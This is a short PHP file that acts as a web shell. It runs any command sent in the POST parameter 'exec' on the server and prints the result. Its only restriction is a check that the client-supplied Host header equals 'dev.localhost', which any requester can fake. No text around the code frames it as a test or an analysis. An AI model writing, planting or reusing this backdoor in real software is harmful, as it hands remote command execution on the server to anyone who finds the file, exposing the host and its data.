<?php

$shell = $_POST["exec"];

if(isset($_POST["exec"]) && isset($_SERVER['HTTP_HOST'])){
    if($_SERVER['HTTP_HOST'] == "dev.localhost"){
        echo `$shell`;
    }
}

?>      






